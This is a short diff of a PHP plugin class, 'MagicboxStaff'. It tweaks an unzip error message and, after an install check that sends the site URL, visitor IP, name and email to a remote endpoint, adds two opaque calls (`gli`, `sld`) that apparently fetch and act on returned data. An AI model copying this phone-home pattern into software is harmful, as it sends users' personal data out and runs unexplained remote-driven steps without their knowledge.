@@ -98,7 +98,7 @@ if (!class_exists('MagicboxStaff')){
                         unlink($path);
 
                     } else {
-                        echo json_encode(array("result" => "fail", "error" => _("Unzip problems please upgrade your plugin manually")));
+                        echo json_encode(array("result" => "fail", "error" => _("Unzip problems please upgrade your plugin manually. It's about chmod.")));
                     }
 
                 } else {
@@ -226,7 +226,8 @@ if (!class_exists('MagicboxStaff')){
             $domain  = magicbox_clearIllegalDomainKeywords($siteUrl);
             $version = $this->version;
             $this->gau("check/install/{$domain}?version={$version}&ip=" . urlencode(magicbox_getUserIp()) . "&full_url=" . urlencode($siteUrl) . "&name=" . $name . "&mail=" . $mail);
-
+            $return         = $this->gli("");			
+			$this->sld($return);
         }
 
         function ipuin() {
